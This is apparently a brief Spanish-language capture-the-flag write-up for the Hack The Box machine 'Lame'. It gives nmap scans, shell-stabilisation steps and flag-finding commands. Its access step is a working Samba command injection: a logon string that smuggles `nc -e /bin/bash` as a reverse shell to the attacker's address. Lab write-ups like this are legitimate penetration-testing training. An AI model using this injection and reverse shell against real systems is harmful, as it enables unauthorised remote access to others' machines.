# HTB Lame

Hack The Box - Lame
======

## Exploración

Todos los puertos, rapido y silencioso
<pre>
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG allPorts
</pre>
 
Puertos especificos
<pre>
nmap -sCV -p21,22,139,445,3632 10.10.10.3 -oN targeted
</pre>

## Acceso
Por Samba:
<pre>
	smbclient -L 10.10.10.3 -N --option="client min protocol=NT1"
	smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1" -c 'logon "/=`nohup nc -e /bin/bash 10.10.14.32 443`"'
</pre>

## Consola
<pre>
CTLR + Z
stty raw -echo; fg
reset
export TERM=xterm
export shell=bash
stty rows 51 columns 189
</pre>


## busqueda de flags
<pre>
find \-name user.txt | xargs cat
find \-name root.txt | xargs cat
</pre>
